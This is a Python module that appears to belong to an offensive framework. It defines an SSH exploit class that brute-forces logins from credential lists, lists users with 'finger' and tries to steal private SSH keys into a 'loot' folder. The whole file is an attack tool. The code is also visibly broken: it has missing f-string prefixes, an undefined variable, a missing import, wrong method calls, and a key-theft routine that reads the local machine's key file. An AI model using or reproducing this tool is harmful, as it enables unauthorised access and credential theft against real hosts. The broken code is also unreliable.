from hydra import Exploit
import sys, paramiko, getpass

class SSH(Exploit):
    name = "ssh"
    port = 22

    def getloot(self, ip_address, credentials):
        # try to log into ssh using credentials
        for c in credentials:
            print("Trying to SSH into IP address {ip_address} with:\n username {c[0]} and password {c[1]}")
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(ip_address, username=c[0], password=c[1])

                print('Success. Gathering all usernames.')
                usernames = get_usernames(ssh)
                
                print('Stealing ssh keys.')
                keys = get_sshkeys(self, ssh)
                ssh.close()
                if keys: 
                    with open("../loot/{ip_address}_{c[0]}_sshkey.txt", "w") as text_file:
	                    text_file.write(text)
                return usernames
            except:
                print("Authentication failed.")
                ssh.close()


    def get_sshkeys(self, ssh):
        keys = None
        try:
            with open(os.path.expanduser('~/.ssh/id_rsa')) as f:
                keys = f.read().strip()
        except:
            print("No SSH keys found.")
        return keys

    def get_usernames(self, ssh):
        ssh.invoke_shell()
        stdout= ssh.exec_command ('finger')
        stdout.readline()

        usernames = []
        for line in stdout:
	        toks = line.split(' ')
	        loot = (toks[0], None)
	        if loot not in usernames:
	            usernames.append(loot)
        return usernames